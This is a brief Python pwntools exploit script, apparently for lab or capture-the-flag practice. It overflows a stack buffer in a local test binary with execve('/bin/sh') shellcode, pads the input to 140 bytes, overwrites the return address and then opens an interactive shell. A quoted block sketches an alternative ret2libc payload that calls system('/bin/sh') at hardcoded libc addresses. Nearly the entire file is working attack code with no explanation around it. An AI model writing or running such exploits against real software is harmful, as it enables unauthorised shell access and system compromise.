#!/usr/bin/env python
from pwn import *


#p = remote('127.0.0.1',8888) 
p = process('./test/exp1') 

ret = 0xb7e661c3
 
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"


payload = shellcode + 'A' * (140 - len(shellcode)) + p32(ret)
print payload
"""

p = process('./dep_test')
ret = 0x61616161
systemAdd = 0xb7e98c30
binshAdd  = 0xb7f99e94

payload = 'A'*140 + p32(systemAdd)+ p32(ret) + p32(binshAdd)

using system('/bin/sh')
payload='A'*140+p32(pSystem)+p32(pBish)

"""
raw_input('input:')
p.send(payload) 
p.interactive() 
